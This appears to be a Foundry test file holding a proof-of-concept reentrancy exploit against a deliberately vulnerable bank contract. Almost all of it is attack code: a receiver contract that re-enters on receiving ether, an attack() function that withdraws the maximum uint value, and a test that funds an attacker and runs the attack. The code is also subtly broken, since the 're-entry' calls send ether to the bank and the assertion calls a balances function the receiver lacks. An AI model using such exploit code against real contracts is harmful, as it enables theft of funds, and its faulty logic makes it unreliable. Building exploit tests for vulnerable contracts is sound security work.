// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/59211d84-c7b9-40c4-b46b-03384be2eb91_VulnerableBank.sol";

contract ReentrancyReceiver {
    VulnerableBank private immutable target;
    uint256 private immutable amount;

    constructor(VulnerableBank target_) {
        target = target_;
        amount = 1 ether;
    }

    receive() external payable {
        if (address(target).balance >= msg.value * 2) { // Ensure enough balance to withdraw twice
            for (uint256 i; i < 2; ++i) { // Trigger reentrancy twice
                (bool success, ) = address(target).call{value: amount}("");
                require(success, "Withdraw failed");
            }
        }
    }

    function attack() external payable {
        require(msg.value == amount, "incorrect seed");
        target.deposit{value: amount}();
        // Trigger reentrancy
        uint256 max;
        assembly {
            max := sub(0, 1)
        }
        target.withdraw(max);
    }
}

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    ReentrancyReceiver receiver;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        receiver = new ReentrancyReceiver(target);
        vm.deal(attacker, 10 ether);
        vm.deal(address(target), 20 ether); // Ensure sufficient balance for the attack
    }

    function testExploit() public balanceLog {
        vm.prank(attacker);
        receiver.attack{value: 1 ether}();
        // Ensure attacker has more than 1 ether
        assertGt(receiver.balances(attacker), 1 ether);
    }
}